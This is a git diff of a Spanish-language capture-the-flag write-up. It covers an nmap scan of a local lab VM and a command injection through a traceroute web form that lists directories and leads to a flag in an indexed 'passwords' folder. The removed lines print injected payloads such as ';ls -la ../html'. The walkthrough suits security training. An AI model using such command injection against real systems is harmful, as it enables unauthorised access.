@@ -9,7 +9,7 @@
 
 Descargue la vm y luego de correrla en VirtualBox, lo primero que hice fue hacer un escaneo de todos los puertos y las versiones de sus servicios:
 ```console
-root@localhost: nmap -sV 192.168.56.106 -p- 
+root@localhost$: nmap -sV 192.168.56.106 -p- 
 PORT      STATE SERVICE VERSION
 21/tcp    open  ftp     vsftpd 3.0.3
 22/tcp    open  ssh?
@@ -52,47 +52,24 @@ Ingrese 8.8.8.8 y la respuesta fue:
 ```
 traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets
 ```
-Lo proximo que probe fue hacer un command injection haciendo un **ls**. Puse lo sigueinte en el cuadro de trace
+Lo proximo que probe fue hacer un command injection haciendo un **ls -la**. Puse lo sigueinte en el cuadro de trace
 
-```
-;ls -la
-```
-Y la respuesta fue:
-```
-drwxr-xr-x. 2 root root  50 Aug 25  2017 .
-drwxr-xr-x. 4 root root  33 Aug 22  2017 ..
--rwxr-xr-x. 1 root root 255 Aug 22  2017 root_shell.cgi
--rwxr-xr-x. 1 root root 787 Aug 25  2017 tracertool.cgi
-```
+![alt text](https://i.imgur.com/0m8uZV0.png)
+
+
 Listo, esto se puede explotar de alguna manera, asi que hice que me liste todo un paso atras:
-```
-;ls -la ../
-```
-Respuesta:
-```
-total 4
-drwxr-xr-x.  4 root root   33 Aug 22  2017 .
-drwxr-xr-x. 22 root root 4096 Aug 21  2017 ..
-drwxr-xr-x.  2 root root   50 Aug 25  2017 cgi-bin
-drwxr-xr-x.  3 root root   76 Aug 22  2017 html
-```
+
+![alt text](https://i.imgur.com/FWaSKyp.png)
+
 Ahi pude ingresar a la carpeta html y ver que existe un archivo llamado "password"
-```
-;ls -la ../html
-```
-Respuesta:
-```
-total 536
-drwxr-xr-x. 3 root root     76 Aug 22  2017 .
-drwxr-xr-x. 4 root root     33 Aug 22  2017 ..
--rw-r--r--. 1 root root    326 Aug 22  2017 index.html
--rw-r--r--. 1 root root 539672 Aug 22  2017 morty.png
-drwxr-xr-x. 2 root root     44 Aug 23  2017 passwords
--rw-r--r--. 1 root root    126 Aug 22  2017 robots.txt
-```
+
+![alt text](https://i.imgur.com/zkB7hQi.png)
+
 Por ultimo navegue a esa misma ruta y vi que el directorio estaba con el Index habilitado y tenia un archivo llamado FLAG.txt donde encontre la segunda bandera.
 
 **http://192.168.56.106/passwords/**
+
+![alt text](https://i.imgur.com/ukCit3U.png)
 
 #### FLAG{Yeah d- just don't do it.} - 10 Points
 
